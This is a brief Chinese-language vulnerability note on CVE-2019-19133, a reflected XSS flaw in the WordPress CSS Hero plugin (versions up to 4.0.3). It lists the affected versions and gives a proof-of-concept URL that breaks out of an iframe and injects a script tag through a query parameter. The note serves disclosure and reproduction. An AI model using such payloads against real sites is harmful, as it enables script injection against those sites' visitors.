---
title: （CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss
id: zhfly3254
---

# （CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss

## 一、漏洞简介

## 二、漏洞影响

CSS Hero插件 (<= v.4.0.3)

## 三、复现过程

首先WordPress应用中确保CSS Hero Plugin安装。

poc

```
hxxp://
0-sec.org/?csshero_action=edit_page&rand=1015&foo%22%3E%3C/iframe%3E%3Cscript%3Ealert(%27Reflected%20XSS%20in%20CSS%20Hero%204.0.3%27)%3C/script%3E%3Ciframe%3Ebar 
```